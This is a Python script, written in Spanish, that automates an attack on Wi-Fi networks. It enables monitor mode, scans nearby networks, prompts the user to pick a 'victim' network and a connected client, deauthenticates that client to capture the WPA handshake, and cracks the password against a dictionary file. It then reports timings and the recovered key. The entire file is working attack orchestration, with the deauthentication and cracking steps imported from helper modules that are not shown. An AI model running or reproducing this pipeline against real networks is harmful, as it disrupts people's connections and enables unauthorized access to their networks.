from monitor_mode import iniciar_modo_monitor
from escaneo import escanear_redes
from ataque import iniciar_captura_dirigida, desautenticar, esperar_handshake
from cracking import crackear

import time

def elegir_red(redes: list) -> dict:
    
    # Muestra las redes encontradas y deja al usuario elegir una.
    print("\nRedes encontradas:")
    for indice, red in enumerate(redes):
        print(f"[{indice}] {red['essid']}  (canal {red['canal']}, {red['cifrado']}, {red['bssid']})")

    seleccion = int(input("\nElige el número de la red víctima: "))
    return redes[seleccion]


def elegir_cliente(clientes: list, bssid_victima: str) -> dict:
    
    # Filtra los clientes conectados a la red elegida y deja al usuario elegir uno.
    
    clientes_de_la_red = []
    for c in clientes:
        if c["bssid_conectado"] == bssid_victima:
            clientes_de_la_red.append(c)

    if not clientes_de_la_red:
        raise RuntimeError("No se encontraron clientes conectados a esa red todavía. Intenta escanear de nuevo.")

    print("\nClientes conectados a esa red:")
    for indice, cliente in enumerate(clientes_de_la_red):
        print(f"[{indice}] {cliente['mac_cliente']}")

    seleccion = int(input("\nElige el número del cliente a desautenticar: "))
    return clientes_de_la_red[seleccion]

def mostrar_informe(tiempos: dict, resultado_cracking: dict):

    # Imprime el resumen final con las estadísticas
    print("\n" + "=" * 40)
    print("INFORME FINAL")
    print("=" * 40)
    print(f"Tiempo de escaneo:            {tiempos['escaneo']:.1f} s")
    print(f"Tiempo de captura+desauth:    {tiempos['captura']:.1f} s")
    print(f"Tiempo de cracking:           {tiempos['cracking']:.1f} s")
    print(f"Paquetes capturados:          {resultado_cracking['paquetes_leidos']}")
    print(f"Claves probadas:              {resultado_cracking['claves_probadas']}")
    if resultado_cracking["encontrada"]:
        print(f"Contraseña encontrada:        {resultado_cracking['contrasena']}")
    else:
        print("Contraseña NO encontrada con este diccionario.")
    print("=" * 40)

if __name__ == "__main__":
    nombre_interfaz = input("Escribe el nombre de tu interfaz Wi-Fi (ej. wlan0): ")
    interfaz_monitor = iniciar_modo_monitor(nombre_interfaz)
    inicio_escaneo = time.time()
    redes, clientes = escanear_redes(interfaz_monitor)
    fin_escaneo = time.time()

    red_elegida = elegir_red(redes)
    cliente_elegido = elegir_cliente(clientes, red_elegida["bssid"])

    print(f"\nObjetivo: red '{red_elegida['essid']}' ({red_elegida['bssid']}), cliente {cliente_elegido['mac_cliente']}")
    
    inicio_captura = time.time()

    archivo_captura = "captura"
    proceso_captura, maestro_captura = iniciar_captura_dirigida(interfaz_monitor, red_elegida["bssid"], red_elegida["canal"])
    time.sleep(10)

    archivo_cap = f"{archivo_captura}-01.cap"
    handshake_logrado = esperar_handshake(
        archivo_cap,
        red_elegida["bssid"],
        interfaz_monitor,
        cliente_elegido["mac_cliente"],
        maestro_captura
    )

    proceso_captura.terminate()
    proceso_captura.wait()

    fin_captura = time.time()

    if not handshake_logrado:
        print("\nNo se logró capturar el handshake. Intenta de nuevo.")
        exit()

    # --- Etapa 3: cracking ---
    inicio_cracking = time.time()
    resultado = crackear(archivo_cap, red_elegida["bssid"], "diccionarios/comunes.txt")
    fin_cracking = time.time()

    tiempos = {
        "escaneo": fin_escaneo - inicio_escaneo,
        "captura": fin_captura - inicio_captura,
        "cracking": fin_cracking - inicio_cracking,
    }

    mostrar_informe(tiempos, resultado)